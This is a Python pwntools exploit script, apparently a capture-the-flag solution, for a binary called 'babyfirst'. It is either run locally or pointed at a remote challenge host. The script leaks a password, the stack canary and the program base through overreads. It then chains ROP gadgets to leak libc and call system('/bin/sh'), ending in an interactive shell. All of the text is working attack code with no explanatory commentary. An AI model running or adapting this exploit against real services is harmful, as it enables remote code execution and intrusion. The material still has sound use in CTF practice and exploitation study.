#!/usr/bin/env python

from pwn import *

if (sys.argv[1] == "local"):
    r = process("./babyfirst")
else:
    r = remote("babyfirst.chung96vn.cf", 31337)

def login(username,password=None):
    r.recvuntil("Your choice: ")
    r.sendline("1")
    r.recvuntil("Name: ")
    r.send(username)
    if (password != None):
        r.recvuntil("Password: ")
        r.send(password)

elf = ELF("./babyfirst")
libc = ELF("./libc-2.27.so")
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
puts_off = libc.symbols["puts"]
system_off = libc.symbols["system"]
bin_sh_off = next(libc.search("/bin/sh"))
login("A"*0x20)

r.recvuntil("Your choice: ")
r.sendline("2")
r.recvuntil("A"*0x20)
password = r.recv(0x10)
login("admin\n",password)

r.recvuntil("Your choice: ")
r.sendline("2")
r.recvuntil("Content: ")
r.send("A"*0x29)
r.recvuntil("A"*0x29)
canary = u64("\x00" + r.recv(7))
log.info("canary: %s" % hex(canary))

r.send("A"*0x38)
r.recvuntil("A"*0x38)
base_text = u64(r.recv(6) + "\x00\x00") - 0xF8D
log.info("base_text: %s" % hex(base_text))
pop_rdi = base_text + 0x1023
puts_plt_addr = base_text + puts_plt
puts_got_addr = base_text + puts_got

r.send("A"*0x28 + p64(canary) + "A"*8 + p64(pop_rdi) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(base_text + 0xE66))
r.send("END")
r.recvuntil("OK~~\n")
base_libc = u64(r.recv(6) + "\x00\x00") - puts_off
log.info("base_libc: %s" % hex(base_libc))
system_addr = base_libc + system_off
bin_sh_addr = base_libc + bin_sh_off

r.send("A"*0x28 + p64(canary) + "A"*8 + p64(base_text+0x90e) + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr))
r.send("END")
r.interactive()
